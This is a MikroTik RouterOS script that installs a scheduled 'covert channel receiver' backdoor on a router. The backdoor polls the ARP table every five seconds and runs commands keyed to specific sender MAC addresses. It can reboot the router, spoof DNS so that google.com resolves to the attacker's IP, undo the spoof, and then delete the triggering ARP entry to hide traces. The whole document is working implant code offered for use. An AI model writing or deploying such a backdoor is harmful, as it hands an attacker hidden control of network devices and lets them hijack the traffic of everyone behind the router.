/system script
add name="covertChannelReceiver" source={
    # Removes an entry from ARP table by its MAC address
    :global removeArpEntry do={
        /ip arp remove [ /ip arp find where mac-address=$macAddress ]
    }

    # Reboots
    :global doReboot do={
        :system reboot
    }

    # Spoof a domain with sender's (attacker's) IP address
    :global doDnsSpoof do={
        :if ( ![ /ip dhcp-server get dhcp1 disabled ] && [ /ip dhcp-server network find where dns-server=$routerIp ] != "" ) do={ 
            /ip dns static add name="google.com" address=$senderIp
        }
    }

    # Revert DNS spoofing
    :global undoDnsSpoof do={
        /ip dns static remove [ /ip dns static find where address=$senderIp ]
    }

    # Lookup table: SENDER MAC ADDRESS -> COMMAND
    :global LOOKUP {
        "92:F3:FD:8A:A9:AB"="REBOOT";
        "31:F5:9D:34:BE:0A"="DNS_SPOOF";
        "51:F7:AD:44:CE:1B"="UNDO_DNS_SPOOF";
    }

    # Executes command based on sender's MAC address
    :global execCommandOrNothing do={
        :global LOOKUP
        :global doReboot;
        :global doDnsSpoof;
        :global undoDnsSpoof;
        :global removeArpEntry

        :log info ("exec: arpSenderMac=$arpSenderMac arpSenderIp=$arpSenderIp arpRouterIp=$arpRouterIp")

        :local command ($LOOKUP->$arpSenderMac)

        :if ( $command = "REBOOT" ) do={
            $doReboot
        }
        :if ( $command = "DNS_SPOOF" ) do={
            $doDnsSpoof senderIp=$arpSenderIp routerIp=$arpRouterIp senderMac=$arpSenderMac
        }
        :if ( $command = "UNDO_DNS_SPOOF" ) do={
            $undoDnsSpoof senderIp=$arpSenderIp senderMac=$arpSenderMac
        }

        # removes command ARP table entry after command is done
        :if ( [ :len $command ] != 0 ) do={
            $removeArpEntry macAddress=$arpSenderMac
        }
    }

    :log info "Script run..."

    :foreach i in=[ /ip arp find ] do={
        :local arpSenderMac [ /ip arp get $i mac-address ]
        :local arpSenderIp  [ /ip arp get $i address ]
        :local arpInterface [ /ip arp get $i interface ]

        :local arpRouterIpWithMask [ /ip addr get [ /ip addr find where interface=$arpInterface ] address ]
        :local arpRouterIp [ :pick [ $arpRouterIpWithMask ] 0 ([ :len [ $arpRouterIpWithMask ] ] - 3) ]

        :log info ("sender MAC=$arpSenderMac, sender IP=$arpSenderIp, interface=$arpInterface, router IP=$arpRouterIp")

        $execCommandOrNothing arpSenderMac=$arpSenderMac arpSenderIp=$arpSenderIp arpRouterIp=$arpRouterIp
    }
}

/system scheduler
add name="covertChannelReceiver" interval=5s on-event=covertChannelReceiver